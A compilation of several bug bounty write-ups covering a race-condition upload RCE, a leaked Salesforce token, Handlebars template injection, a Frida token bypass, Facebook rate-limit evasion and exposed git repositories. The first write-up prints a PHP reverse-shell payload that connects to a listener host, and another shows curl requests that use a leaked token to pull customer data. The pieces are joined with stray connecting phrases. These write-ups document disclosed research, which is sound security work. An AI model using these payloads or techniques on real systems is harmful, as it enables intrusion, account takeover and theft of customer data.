Update II: “We” at this series of article will refer to Faisal Yudo Hernawan , Tomi , and Me. Update III: The way to exploiting the “upload.php” function has been released at Tomi’s write-up . It could be bypass with the .phtml extension. I. INTRODUCTION 1.1. Few Words about this Write-Up As an information, this simple write-up talks about a story related how I chained few bugs at one of private program, which is from a simple recon to simple SQL Injection, Race Condition, and finally lead to an RCE. Since the found RCE is little unique, then, this simple write-up will begin from an RCE that triggered from Race Condition. InshaAllah, the other will be released later. 1.2. Simple Summary Some reader maybe feels more comfortable with a summary. Then at this section, we will explain the whole summary related our “journey” to get an RCE. While we got an access into the internal dashboard of administrator (by using the account that has been dump from SQL Injection Result), then we found out the upload feature in the app. Basically, this app has a protection for not giving any permission to users to upload the .php extension (let’s say, the function is upload.php - previously, it was vulnerable by uploading the .phtml extension). But then, the first unique issue is come when this application provides another function (let’s called, modify.php ) that could be used to replace / deleteing the previous uploaded file. The good one is, this modify.php function is not designed to filtering any extension just like the upload.php did. So, we could easily to upload the .php file into the site. But then, the problem for us exists when the app moving out the uploaded file into the S3 bucket. In other words, it’s not possible then to get an RCE at the app’s server since the shell is stored at S3 bucket (and didn’t work too). At one condition, then we tried to re-send the upload request (by using those modify.php function) multiple times (it just like a race condition) and suddenly we got a different response length that contain an error with local stored path information. From this execution, then we realized if the file was stored locally around 2 seconds before its automatically moving into the S3 bucket. So, the next is, we setup the listener at our server (by simply using an “nc -lvp listener_port”), and then tried to conduct the same race condition again (with re-uploading the reverse shell at the modify.php function) and finally in parallel, we request the found local stored path previously at the our browser (it just like, we press the “Command + R” multiple times) until our terminal showing up the shell from the app’s server. After several request (somehow more than 20–30 requests), then finally we got a shell of the app’s server. Press enter or click to view image in full size Figure 1 RCE Result II. THE DETAIL STORY ABOUT THE RCE At this section, we will try to explain in step by step about how finally we got an RCE. FYI, we tried to sketch the interface manually as best as we can, so hopefully could help the readers to see the situation. 2.1. Facing the Internal Dashboard — Meet the Upload Function So, after we got an access into the internal dashboard (will be released later about how we got it), we didn’t stop hunting. At this point, then we tried to look any file upload feature that maybe exist at the app. After few minutes, then we finally found a feature that could be used to publish a news/article via this dashboard. And then, we learn that if every file that we would like to upload to every available section (news/article or anything), then it will be procced by the function called upload.php. Basically, every available section will have an upload interface like this: Press enter or click to view image in full size Figure 2 Interface of Upload Feature Without thinking too much, then we directly upload the simple .php shell again via this feature ( previously, it was vulnerable by giving the .phtml extension and fixed. Then we tried to test this feature again). But things aren’t going well, the feature has a protection to filter the .php extension. We tried to combining the extension with upper & lower case (ex: .PhP), also added some number behind the extension (ex: .php3), and tried various way (as far as we know — doubling the extension, null character, added ; character, and more) to bypass the protection, then it failed. We always got this lovely warning. Press enter or click to view image in full size Figure 3 Protection at the Application Then we think, how about the stored XSS, such as maybe upload the .html, .xml, or .svg format? Well, this one is successfully uploaded. But then, we realized if the file was moving out into the S3 bucket. Then, what’s the point if we could trigger the XSS but at the S3 bucket domain? Well, since we have no idea to “using” it further, then we assume if this one is not an issue. 2.2. Meet the Second Upload Function, Modify.php What’s next? After we have no idea about how to “use” the “uploaded” file into the S3 bucket, then we back into first page of “news” section that contain so many forms to be add with the new content. After looking it carefully, then we realized if there is an “edit” button at the same row with the legitimate file that uploaded into the S3 bucket. Press enter or click to view image in full size Figure 4 Function Edit / Delete the Uploaded File At this point, we try to click the “edit” button and trying to see what will happened. Just as expected, then we will face the upload feature too at this section. At the first time we see it, we think that this form is filtering the .php extension too (since we thought, how can it could be different with the first one?). But, surprisingly , this upload feature doesn’t filter any extension yet. In short, we could upload the .php file directly without meet any trouble. Press enter or click to view image in full size Figure 5 Upload Feature to Replacing the Existing File When our shell has been uploaded, then we try to re-upload the shell and find out the function that used. If this one doesn’t have any filter feature yet, then high possibility if this is the different function as previous. And our assumption is correct. The function that used at this endpoint is “ modify.php ”, not “ upload.php ”. Here is the sample request that made with “modify.php”: Content-Disposition: form-data; name=\"fileid\" 31337 -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"name\" picture-1.png -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"description\" -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"userfile\"; filename=\"reverse.php\" Content-Type: text/php <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.20.30.40/21234 0>&1'\"); -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"save\" Save So, is it finish? So sad, not yet . The .php file is also moving out into the S3 bucket and we can’t do anything with the uploaded file. 2.3. Race Condition to Get the Local Path To be honest, at that time, we have no idea anymore, until we finally try to send the request multiple times with “null” payloads (via intruder mode at burpsuite). Please kindly don’t ask, why we do that. Surprisingly, after several request has been made, we got a different response length (somehow need around 10 requests, somehow more than 20–30 requests). If the normal request will result to 1147 response lengths, at one point, it hits 1710 response lengths. Here is the sample of the “same” multiple request that we did: Press enter or click to view image in full size Figure 6 Sending Multiple Request with Null Payload And here is the normal response that we will get normally (1147 response lengths): Press enter or click to view image in full size Figure 7 Normal Response with 1147 Response Lengths So, what is the content from the un-normal response length that we got? The good one, it reveals the local path of the file. Press enter or click to view image in full size Figure 8 The Race Condition has Reveals the Local Path When we see this result, then finally we thought if we just need to access the path at the browser and waiting for the listener triggering up the shell. But once again, so sad, it not like that. When access the file via our browser, we got the famous alert, which is: “File not Found” . And if we check the path of the file that has been uploaded, it still showing the S3 bucket location, not the local path that we got from this error. So, from this execution, we learn if the file is somehow was stored locally around 1–2 seconds before they move it automatically into the S3 bucket. 2.4. Triggering the Shell and Got an RCE From the last assumption, then there is one thing that come up at our mind: “ how if we run the race condition again, and at the same time, we request the local path that we found (from the error result) to our browser to triggering the reverse shell? ” How is it? Finally, this trick works well . So, we setup the listener at our server -> then try to replacing the existing file at the app with our reverse shell -> conduct the race condition multiple times (1,000 requests could buffer our time) -> take the local path from the different response length from race condition execution -> repeatedly access the path via our browser -> and when the app is hit by the race condition again, then the shell will be triggered into our listener. Here is the simple flow related the execution: Press enter or click to view image in full size Figure 9 Flow of the Execution And here is the simple result from the RCE: Press enter or click to view image in full size Figure 10 RCE Result III. THE CLOSING Much things (at least, for us) that we could learned from this bug. Few of the good things are: There is a possibility for us to get the local path of the uploaded file before the file itself is moving out into the S3 bucket. Even only 1 or 2 seconds, then its enough for us to triggering the shell into our listeners; Always try to edit your own uploaded file. From this case, we seen that if there is a possibility if the upload feature is executed from two separate function (which is the upload.php and modify.php in this situation); And maybe much more that we don’t know yet.

In a recent bounty program for a company I can’t disclose, I found a hilarious information disclosure that is a great example of why you should always check out the source code. This vulnerability sat inside a enrollment portal that was meant for people to redeem discounts that worked for affiliated companies. It required you to enter any email, and the account phone number. In the next step, it required some extra steps of verification. One being, the last 4 of the SSN which turned out not to have a request limit….oops? LOL This vulnerability started out being no request limit turning into an information disclosure, as I reported this to the company soon after checking to see if they fixed it I happened to check out the source code on the next step. That’s when I found more that adds to the information disclosure! It included a HTML comment that I originally believed to only contain filler info…but no it actually was information of the account. It contained the account number and the answer to one of the extra verification steps! Crazy right? I couldn’t believe a company this large, to have something so simple. With this someone with malicious intent would be able to complete the verification, know the customers last 4 of the ssn, and the extra verification info that included the answer in the source code.

Here’s the full content:\n\nLeaked Salesforce API access token at IKEA.com | by Jonathan Bouman | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Leaked Salesforce API access token at IKEA.com Jonathan Bouman 6 min read · Apr 4, 2019 -- 4 Listen Share Press enter or click to view image in full size Proof of concept Background Previously we discussed a Local File Inclusion bug at IKEA.com , the bug was quite complicated and showed us that you have to think out of the box in order to exploit it. This time we will learn how a relative simple and easy to spot bug can have a high impact; a potential data leak of customer data. Plenty of high profile brands use Salesforce for their Customer Relationship Management (CRM); it’s perfect for customer care support. Furthermore it’s real easy to implement their software on your own website by using their API. IKEA.com As mentioned in our previous bug report , IKEA is a nice brand with a proper responsible disclosure statement. So we’re safe to help them find bugs, maybe even in exchange for a reward. Time to search for bugs! Finding targets As always we start with a search for interesting sub domains. A good start is to use Amass , it will query different public available data sets and gives you a nice list of sub domains back. However searching manually in different data sets is never a bad idea; search the social media accounts of the brand for interesting sub domains and URLs. Open Facebook.com, Twitter.com and LinkedIn.com; search the brand name, search for domain names and see what you end up with. IKEA Spain Tweet IKEA Customer care The Tweet deeplinks to https://social.ikea.es/KAirva which resolves to https://ww9.ikea.com/es/es/contacto/formulario.php?cid=a1:of%7Ca2:es%7Ca3:csc_social%7Ccc:915 a simple page with a web form. Press enter or click to view image in full size Forms always deserve a closer look; are there any query parameters reflected in the source ( reflected XSS ), are you able to upload arbitrary files ( stored XSS ) or are you able to inject HTML code in one of the fields, code that is being executed in the web interface of the administrator ( blind XSS )? Query parameters A good start is to search with the Param Miner (Burp Suite plugin) for query parameters that are being reflected in the page source. Found a parameter? Put the request in the Burp Suite Repeater and check if you can create a reflected XSS bug. Long story short: no luck today, no XSS vulnerable reflected parameters are being found on this page. The file upload The next thing we check is the file upload; where do upload files end up and are we able to upload our own how HTML files to a public IKEA url? Lets open the Chrome DevTools , select a file, press the upload button and watch the network requests being made. Of course you can also use the Burp Suite Proxy History to see the requests. This time we discover something special. Our browser actually makes quite a few requests in order to upload a simple file. Let’s have a closer look at these requests, what is happening? Press enter or click to view image in full size Three requests are needed for a simple file upload The first request https://ww9.ikea.com/es/en/contact/sendFormS4G.php creates a Salesforce Object ID for the ticket and returns us the ID . The second request https://ww9.ikea.com/es/en/contact/loginS4G.php gives returns a Salesforce API access token The third request https://ww9.ikea.com/es/en/contact/sendAttachmentS4G.php uploads the file to the Object ID returned by the first request, using the Salesforce API access token from the second request. That looks quite cumbersome, making three requests for a simple upload, but if it works it works. What about the API access token that is being shared with our browser? Does it only has access to our Salesforce object ID or can we use it to access other objects as well? We may use this access token to make requests directly to the Salesforce REST API. Salesforce documentation Let’s open the Salesforce REST API documentation : - How to use the access token in our requests - How to check which objects we can access - How to create a list output of a specific object type . Salesforce REST API We are able to list the different type of objects and our access permissions by requesting the following URL: curl https://yourInstance.salesforce.com/services/data/v37.0/sobjects/ -H \"Authorization: Bearer token\" Press enter or click to view image in full size We can access,search, create and delete all the account objects. This means we may have a potential customer data leak. The output from above is a small snippet of the 389kb JSON file being returned. It contains 465 different object types; from AuthConfigs till Emailmessages , for most we are allowed to query and retrieve them. Mmm. What about customer data? During bug bounties you want to show the impact of a bug, but at the same time you need to be responsible . That means that you need to limit the amount of data you request, don’t dump the full database, just a few records is enough to show the impact. Lets create a small list of 25 customers with their names and phone numbers. We do this by requesting a list of users from an account. curl https://eu15.salesforce.com/services/data/v43.0/sobjects/Account/listviews/00B24000003oGRNEA2/results -H “Authorization: Bearer 00D24XXXXXXXXXXXXXX” -o poc1.json Press enter or click to view image in full size Output of poc1.json: definitions of the columns A snippet of the output, name and phone is censored from the screenshot We just proved that this bug may lead to a customer data leak, so it’s time to write the report and inform IKEA. Conclusion IKEA uses Salesforce for some of their customer care support forms on IKEA.com. In one of those web forms we were able to upload files to their Salesforce instance. IKEA shared their Salesforce API access token with our browser in order to do this. This shared access token was not restricted to only our own support ticket, but it gave access to other customer data as well; a potential customer data leak is the result. This learns us that whenever we run into Salesforce access tokens we should check their access permissions by making requests to the external REST API of Salesforce. Solutions - Restrict access permissions of the shared access token - Don’t share any access tokens with a visitor, handle the file upload server side.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHandlebars template injection and RCE in a Shopify app Skip to main content Search This Blog Mahmoud Gamal - Security Blogs Handlebars template injection and RCE in a Shopify app Get link Facebook X Pinterest Email Other Apps April 04, 2019 TL;DR We found a zero-day within a JavaScript template library called handlebars and used it to get Remote Code Execution in the Shopify Return Magic app. The Story: In October 2018, Shopify organized the HackerOne event \"H1-514\" to which some specific researchers were invited and I was one of them. Some of the Shopify apps that were in scope included an application called \"Return Magic\" that would automate the whole return process when a customer wants to return a product that they already purchased through a Shopify store. Looking at the application, I found that it has a feature called Email WorkFlow where shop owners can customize the email message sent to users once they return a product. Users could use variables in their template such as {{order.number}} , {{email}} ..etc. I decided to test this feature for Server Side Template injection and entered {{this}} {{self}} then sent a test email to myself and the email had [object Object] within it which immediately attracted my attention. So I spent a lot of time trying to find out what the template engine was, I searched for popular NodeJs templates and thought the template engine was mustache (wrong), I kept looking for mustache template injection online but nothing came up as Mustache is supposed to be a logicless template engine with no ability to call functions which made no sense as I was able to call some Object attributes such as {{this.__proto__}} and even call functions such as {{this.constructor.constructor}} which is the Function constructor. I kept trying to send parameters to this.constructor.constructor() but failed. I decided that this was not vulnerable and moved on to look for more bugs. Then the fate decides that this bug needs to be found and I see a message from Shopify on the event slack channel asking researchers to submit their \"almost bugs\" so if someone found something and feels it's exploitable, they would send the bug to Shopify security team and if the team manages to exploit it the reporter will get paid as if they found it. Immediately I sent my submission explaining what I have found and at the impact section I wrote \"Could be a Server Side template injection that can be used to take over the server ¯\\_(ツ)_/¯\". Two months passed and I got no response from Shopify regarding my \"almost bug\" submission, then I was invited to another hacking event in Bali hosted by Synack. There I met the Synack Red Team and after the Synack event has ended, I was supposed to travel back to Egypt, but only 3 hours before the flight I decided to extended my stay for three more days then fly from Bali to Japan where I was supposed to participate in the TrendMicro CTF competition with my CTF team. Some of the SRT also decided to extend their stay in Bali. One of those was Matias so I contacted him to hangout together. After swimming in the ocean and enjoying the beautiful nature of Bali, we went to a restaurant for dinner where Matias told me about a bug he found in a bug bounty program that had something to do with JavaScript sandbox escape so we spent all night missing with objects and constructors, but unfortunately we couldn't escape the sandbox. I couldn't take constructors out of my head and I remembered the template injection bug I found in Shopify. I looked at the HackerOne report and thought that the template can't be mustache so I installed mustache locally and when I parsed {{this}} with mustache it actually returns nothing which is not the case with the Shopify application. I searched again for popular NodeJs template engines and I found a bunch of them, I looked for those that used curly brackets {{ }} for template expressions and downloaded them locally, one of the libraries was handlebars and when I parsed {{this}} it returned [object Object] which is the same as the Shopify app. I looked at handlebars documentation and found out that it's also supposed to not have much logic to prevent template injection attacks. But knowing that I can access the function constructor I decided to give it a try and see how I can pass parameters to functions. After reading the documentation, I found out that in handlebars developers can register functions as helpers in the template scope. We can pass parameters to helpers like this {{helper \"param1\" \"param2\" ...params}} . So the first thing I tried was {{this.constructor.constructor \"console.log(process.pid)\"}} but it just returned console.log(process.pid) as a string. I went to the source code to find out what was happening. At the runtime.js file, there was the following function: So what this function does is that it checks if the current object is of type 'function' and if so it just calls it using current.call(context) where context is the template scope, otherwise, it would just return the object itself. I looked further in the documentation of handlebars and found out that it had built in helpers such as \"with\", \"blockHelperMissing\", \"forEach\" ...etc After reading the source code for each helper, I had an exploitation in mind using the \"with\" helper as it is used to shift the context for a section of a template by using the built-in with block helper. So I would be able to perform curren.call(context) on my own context. So I tried the following: Basically that should pass console.log(process.pid) as the current context, then when the handlebars compiler reaches this.constructor.constructor and finds that it's a function, it should call it with the current context as the function argument. Then using {{#with this}} we call the returned function from the Function constructor and console.log(process.pid) gets executed. However, this did not work because function.call() is used to invoke a method with an owner object as an argument, so the first argument is the owner object and other arguments are the parameters sent to the function being called. So if the function was called like current.call(this, context) , the previous payload would have worked. I spent two more nights in Ubud then flew to Tokyo for the TrendMicro CTF. Again in Tokyo, I couldn't take objects and constructors out of my mind and kept trying to find a way to escape the sandbox. I had another idea of using Array.map() to call Function constructor on my context, but it didn't work because the compiler always passes an extra argument to any function I call which is an object containing the template scope which causes an error as my payload is considered a function argument not the function body. There seemed to be many possible ways to escape the sandbox but I had one big problem facing me which is that whenever a function is called within the template, the template compiler sends the template scope Object as the last parameter. For example, if I try to call something like constructor.constructor(\"test\",\"test\") , the compiler will call it like constructor.constructor(\"test\", \"test\", this) and this will be converted to a string by calling Object.toString() and the anonymous function created will be: which will cause an error. I tried many other things but still no luck, then I decided to open the JavaScript documentation for Object prototype and look for something that could help escape the sandbox. I found out that I could overwrite the Object.prototype.toString() function using Object .prototype. defineProperty() so that it calls a function that returns a user controlled string (my payload). Since I can't define functions using the template, all I have to do is to find a function that is already defined within the template scope and returns a user controlled input. For example, the following nodejs application should be vulnerable: test.js example.html Now if you run this template, console.log(process.pid) gets executed. I reported that to Shopify and mentioned that if there was a function within the scope that returns a user controlled string, it would have been possible to get RCE. Later, when I met Ibrahim (@the_st0rm) I told him about my idea and he told me that I can use bind() to create a new function that when called will return my RCE payload. From JavaScript documentation: The bind() method creates a new function that, when called, has its this keyword set to the provided value, with a given sequence of arguments preceding any provided when the new function is called. So now the idea is to create a string with whichever code I want to execute then bind its toString() to a function using bind() after that overwrite the Object.prototype.toString() function with that function. I spent a lot of time trying to apply this using handlebars templates, and eventually during my flight back to Egypt I was able to get a fully working PoC with no need to use functions defined in the template scope. Basically, what the template above does is: And when I tried it with Shopify, I got: Matias also texted me with an exploitation that he got which is much simpler than the one I used: With that said, I was able to get RCE on Shopify's Return Magic application as well as some other websites that used handlebars as a template engine. The vulnerability was also submitted to npm security and handlebars pushed a fix that disables access to constructors. The advisory can be found here: https://www.npmjs.com/advisories/755 In a nutshell You can use the following to inject Handlebars templates: Matias also had his own exploitation that is much simpler: Sorry for the long post, if you have any questions please drop me a tweet @Zombiehelp54 javascript nodejs sandbox Get link Facebook X Pinterest Email Other Apps Comments Mahmoud NourEldin April 4, 2019 at 11:13 AM Wow, very interesting blog Reply Delete Replies Reply Ahiezer April 4, 2019 at 1:22 PM Wow, fantastic word.

So the way you call `apply()` doesn't really matter as the compiler will always call it on the current context. Matias used `#each` helper to shift the context for the section where `apply()` is called to the Function constructor. Btw it wouldn't have been possible to use `#with` as the with helper has the following line in its implementation: ``` if (_utils.isFunction(context)) { context = context.call(this); } ``` Basically what this does is that it checks if the context is a function, and if so it calls it and sets the context to whichever the function returns and in that case it will be an anonymous function returned by the function constructor rather than the Function constructor itself. In my exploit, I used `#blockHelperMissing` which does the same thing as `#with` except that it doesn't have the `_utils.isFunction(context)` check. Thanks for the question. Delete Replies Reply Mahmoud Gamal April 8, 2019 at 10:08 AM Your comment actually made me rethink about how I used `apply()` to call `bind()` in my initial exploit. I should have just used `bind()` the same way `apply()` was used (by shifting the context to `str.toString`). I've modified the exploit so it becomes more clean and easy to understand.

Post a Comment Popular posts from this blog SQL Injection: Utilizing XML Functions in Oracle and PostgreSQL to bypass WAFs February 13, 2023 TL;DR. In this blog post we will be discussing how built-in XML functions in Oracle and PostgreSQL database management systems can be used to bypass web application firewalls (WAFs). I will be presenting two real-life examples from private bug bounty programs where traditional methods for bypassing WAFs were not effective. Introduction It's really frustrating when you find a valid SQL injection vulnerability, but there isn't much to do because of a WAF blocking most of your payloads. Many WAF rules can be bypassed using character case switching, comments, splitting the payload into multiple parameters, double URL encoding and many other methods that depend on how the target application and the WAF handle your requests. However, In the cases we are discussing in this blog, I was not able to bypass the WAF using common WAF bypass methods. Case 1: SQL Injection in an Oracle database - WAF bypass using REGEXP_LIKE() and DBMS_XMLGEN.GETXMLTYPE() *This is a private bug bounty prog... Read more Exploiting Out Of Band XXE using internal network and php wrappers August 06, 2019 Hello hackers, A couple of weeks ago I tweeted about exploiting an out of band XXE vulnerability with a firewall blocking all outgoing requests including DNS lookups, so here is the full story: This is a private bug bounty program so I won't be mentioning who the vendor is. As usual during a hacking night while navigating the target application I came across an endpoint that took a parameter called xml but its value was encrypted. Later I found out that XML data sent to the backend is encrypted in the client side before sent in HTTP requests which means that XML data might not be properly validated in the backend, so I wanted to modify it to be able to inject my own XXE payload. So what I first tried was to find the JavaScript function used to encrypt the XML and do the same for my custom XML payload, however, the application's JavaScript was minimized with WebPack which made it very hard to read and trace functions. To avoid the hassle of finding the JavaScript encrypting...

Later I will mention why this is not the best solution and I will recommend a better one. Prelude Brute force is one of the simple (also noisy) way to guess a password or something you want to know. Basically, in a brute force attack, an attacker tries a combination of passwords, strings, hex values, stack cookies, what you want to find. In this case, the ACME company implemented a custom solution to “stop” brute force attacks based in tokens using native code (.so library ) in an Android application. My client said: No one can read the library to generate a token because is compiled and is not readable. I say to myself : That’s not true, some one can decompile the source code of the library and read the assembler code to understand what the library does. So let’s get started. About the app The application is built for Android and it uses its own token implementation to prevent brute force attacks. Press enter or click to view image in full size Figure 1. Token validation process In Figure 1. We can see how the server handles the token, if the token is valid, the server returns 200, but if the token is invalid, the server returns 401. This token is put in the header and is validate per request. Press enter or click to view image in full size Figure 2. Request example In Figure 2 we can see an example of a request. In the X-ACME-Token header the application place the generated token. This token is used during the login process. The research Due to the kind of test, I perform this research without access to the source code or any information about the application, this is what we call “black-box testing”. I downloaded the APK of the application and opened it with JADX, after a lot of source code review I found the SEC class. This class defines a static segment to load the library with native code. Also is important to note that the application doesn’t obfuscate the code so was easy to JADX decompile the source code and show me in a readable format. Press enter or click to view image in full size Figure 3. Sec class ACME example Second … At this point, I know what is the name of the library so I extract the .so file using the ADB command from the Android emulated device. adb pull /data/data/com.acme.app/lib/libacme-lib.so . In this link I was talk about Genymotion and how prepare an Android lab if you are interested. This is the fun part. I need to do binary research if I want to understand what the file does because I don’t have the source code of the library. Let’s begin with the basic, I used xxd and file command to know more about the file. Press enter or click to view image in full size Figure 4. Basic research in a binary file At this point I know what the file is, the ELF header and the output of the file command confirm that the file is a shared library. The next thing I always do is open the file using the string command. Figure 5. Strings output command. …. very interesting method I found here. Java_com_acme_account_Sec_token Let’s open the library in IDA and examine that method. Figure 6. Library opened with IDA After a couple of hours reading assembler code to try to understand what the library does I decide to move forward with another option (more simplistic and cheaper for my client) maybe if I find some vulnerability in the Login process I can generate my own token… But wait …. something comes to my mind and it was like a. WOW!! … yes, it could works !! Me after a revelation of God FRIDA to the rescue This is an awesome tool, according to the website is: it’s a dynamic code instrumentation toolkit. It lets you inject snippets of JavaScript or your own library into native apps on Windows, macOS, GNU/Linux, iOS, Android, and QNX. Frida also provides you with some simple tools built on top of the Frida API. These can be used as-is, tweaked to your needs, or serve as examples of how to use the API. What is my plan from now? In theory, according to the definition, I could inject snippets of JavaScript into the native apps in this case Java. So I need to find in the code where the SEC class is used and try to understand how the token is generated (reading Java code, not assembler) and maybe generate my own token. My steps: G ive me six hours to chop down a tree and I will spend the first four sharpening the ax. Abraham Lincoln Before diving into the code I spent a couple of hours understanding the FRIDA API. This is a very important step because it allows to me get a better idea of how FRIDA works and the limitations it has. After a while, I felt confident. I opened the APK file again, read some classes, and found what I was looking for … YES !! Press enter or click to view image in full size Figure 7. create a client example class Again, the lack of code obfuscation makes me work easily. In the newBuilder.addHeader() instruction we can see how the X-ACME-Token Header is added and how Sec.access is called. According to the code, three parameters are needed, the first is a Context object, the second is a unique ID, and the last one is an URL. At this point, we can use FRIDA. The POC FRIDA uses python code to enable frida-tools, in this article I explain how is the installation of frida-tools. So I create a basic skeleton of code in python. Figure 8. Python wrapper code The next step is to create a JavaScript snippet. Press enter or click to view image in full size Figure 9. Example of JavaScript snippet There is a lot of more code in Figure 9 to show, however, I am interested in to show you the function used to generate the token. In this code we hook to the Environment class and create a new instance of it, call the setter method, and define a new value using a random string. The next part is the getValidToken function. Press enter or click to view image in full size Figure 10. getValidToken() method In this code, we overload the token function of com.acme.account.Sec. With this function overloaded we can create our acmeID and pass as an argument to the function which generates the token. Press enter or click to view image in full size Figure 11. Token generation Yeah, it worked … in Figure 11 you can see a list of token generated with FRIDA. I configure Burpsuite Intruder with my list of tokens and then I tried to brute force a valid user of ACME… Press enter or click to view image in full size Figure 12. Burpsuite intruder Oh no!!!!! After 54 requests the server return code 500 (which means server error) the status code 400 is for an invalid password but after a series of request the server detect my brute force attack… Nooooo!!! :( The exploit I never give up, so, after resting, I came to the battle again and found this… Press enter or click to view image in full size Figure 13. Context information The Context … if I remember one of the parameters of the token.access function is a Context object , so what happens if I overload the token function again and define it with 3 strings parameters? Press enter or click to view image in full size Figure 14. Token method overload I overload the function and configure my payload with my list of the token. …come on this has to work !! Figure 15. Payload configuration And DAWN men it worked…. Yeahhhh !!! Figure 16. Brute force attack success using Intruder After 303 requests the server still returns 400 code indicating that the password is invalid… Yeah !!!! What happened here? With FRIDA, we overload the function of Token. access so at run-time when I executed my python script which inside uses my JavaScript snippets and lunch an instance of com.acme.app in my emulated android device, the method definition is overloaded, so when I called the method getValidToken(), I am not calling the default method (token), I am calling the overloaded method passing 3 strings as arguments, so I don’t need to pass a context object. I have control of the three arguments and can pass random values to the token function. I use these valid tokens to launch the attack…basically in the backend each request appears valid and the server doesn’t detect my brute force attack. Yeah !!!! …But how we can fix this? The “solution” I found a better way around token-based implementation to prevent brute force attacks using SafetyNET reCAPTCHA API. Figure 17 is a detailed definition. Press enter or click to view image in full size Figure 17. SafetyNET definition This is a basic diagram of how SafetyNET reCAPTCHA does work. In Figure 18 you can see 3 actors (Android app, SafetyNET, and Android Server). The Android app has a Site Key (something like a Public key) which is used to communicate with the SafetyNET server. Then SafetyNET server returns the captcha challenge to the user and then sends the token to the server for validation. The server has the secret key and validates the token against SafetyNET, then SafetyNET server validates this token using its own analyst engine. The response is sent to the server and the server handles the token depending if it is valid or invalid. Press enter or click to view image in full size Figure 18. SafetyNET basic architecture What about ACME ? At the end of this journey, I made my report including a detailed explanation about the vulnerability and how to fix it. Of course, adding SafetyNET to an application in production is not a trivial step, requires planning and in some case, it needs to validate against product team because adding a CAPTCHA affect the user experience using the application. I didn’t exploit any vulnerability like Buffer Overflow, CSRF, SSRF, or something similar, in this case, the vulnerability is the token implementation by itself. Some times you need to spend time in order to understand the application to find this kind of bugs. Please let me know how if you implement SafetyNET reCAPTCHA API and how was the experience.

Adding an Instagram account to Facebook Page will allow us to create Instagram ads in Ads Manager without needing to connect to the Instagram account to a Business Manager. There is an endpoint to connect Instagram account through the mobile browser or “mbasic.facebook.com” POST /Redacted HTTP/1.1 Host: mbasic.facebook.com fb_dtsg: — sanitized — jazoest: — sanitized — username: VICTIM_INSTAGRAM_USERNAME password: VICTIM_INSTAGRAM_PASSWORD page_id: ATTACKER_PAGE_ID Login Security: Facebook uses a rate-limiting mechanism to protect the login request from being password guesses. I could attempt only max 20 wrong passwords in a day. If I exceed 20 attempts, it fired “too many requests.” and then a further request will be blocked. What was Bug here? At the endpoint, Facebook failed to block attempts over Victim Account on the server side. The limit was 20 requests “each Facebook Account.” Bypassing a Rate Limiting: 1 Facebook Account = 20 wrong password attempts were possible at a time. 10 Facebook Accounts = 200wrong password attempts. At this point, I didn’t have a million user account’s to try out more attempts. According to Facebook, we also can create a test account for Facebook applications. [ref- https://developers.facebook.com/docs/apps/test-users/ ] Each Facebook application can create 2000Test Accounts ( like one we can create using “/whitehat/accounts/”) I created around 15 Facebook Apps. 15 apps x 2000 Test Accounts = 30,000 Test Users in a Single Facebook User Account. I created 10 Regular Facebook User Accounts. That mean, 10x30,000 = 300,000Test users So Finally, I could attempt 6,000,000 passwords daily.

So, I was just browsing through bug bounty writeup and found a report on nokia. I didn’t know Nokia also had bug bounty so I decided give it a try. I like to use https://yandex.com to search for subdomains before using https://google.com or https://duckduckgo.com because I think yandex provides more exotic subdomains than google or duckduckgo for a bug bounty hunter. So, I decided to use yandex to search for subdomain using site operator. After some scrolling I discovered http://emop.ext.net.nokia.com . It had a login prompt and looked really old so I thought maybe there are some vulnerabilites here. I like to use nikto to discover vulnerabilites for such websites. So I always use https://suip.biz/?act=nikto to scan for vulnerabilites using nikto. I absolutely love https://suip.biz because there are various tools like nikto, whatweb, sqlmap which can be used online thanks to https://suip.biz. I decided to use nikto and whatweb on nokia subdomain and found that it was a Drupal site. I immediately decided to check the version of Drupal and turns out it was vulnerable to various vulnerabilites like Drupalgeddon. So, I decided to send report to security-alert@nokia.com and I received a message in two weeks to ask for my name to be featured in hall of fame . So, I decided to visit Nokia white hat page and it turned out it updates it’s page based on month. So, I will probably be featured in hall of fame after the end of this month. The things I would like for you take away from this post are described below. Always, always read bug bounty writeups and completely stalk a researcher you love in every social media you can find on him/her to find every tips and knowledge s/he would provide. Use suip.biz because it provides great tools and as it’s completely free so more people should find and use it. Use Yandex before Google or DuckDuckGo because in my opinion it provides subdomains which can be more vulnerable and useful for bug bounty hunter. If you read more bug bounty then just like I automatically decided to check this subdomains you will understand which subdomain might be more vulnerable and which should be tested more than other subdomains. You will automatically decide to check for CSRF or IDOR after browsing a page because it would give you a feeling that it might be vulnerable to it and you would be more right about it than wrong.

The main focus was to discover common configuration issues which do not require sophisticated exploits, which are easy to find and which can have a high impact on businesses. Some results of this research were presented at ITSECX 2018 , an Austrian IT-Security conference. The slides of my talk can be found here . TL; DR I found out, that www.ebay.co.jp runs a version control repository on their production site which was not properly secured. This gave me access to the .git folder in the webroot directory which further allowed me to download the entire source code of www.ebay.co.jp including database passwords and much more. The initial research for this topic was performed back in 2015 by internetwache.org - their blog post about their findings can be found here and I highly recommend to read it! Dumping eBay’s Source Code I used the GitTools published by internetwache.org which can be found here . I ran this script through millions of Alexa Top 1 Million subdomains. When checking the results, eBay Japan popped up. In order to initially verify the bug, I accessed www.ebay.co.jp/.git/HEAD and the following came up: eBay leaks git repo This was a strong indicator, that the website is actually vulnerable. Due to the fact that eBay runs a bug bounty program and www.ebay.co.jp is in scope, I dumped their source code using the GitTools scripts. While waiting for the download to finish I reported the issue to eBay. I was able to download about 700 MB of compressed data. After extracting, I got 1.2 GB of data to go through. The data-set contained: Wordpress configuration files (yes, they use Wordpress) including hashed user credentials for the backend login Database passwords for production databases Log files A lot of PHP source code (who could have guessed?!) much more … Ebay was very responsive and fixed the issue about 10-12 hours after I reported it. Sadly, they have no cash rewards for valid bugs but I got added to their Hall of Fame .

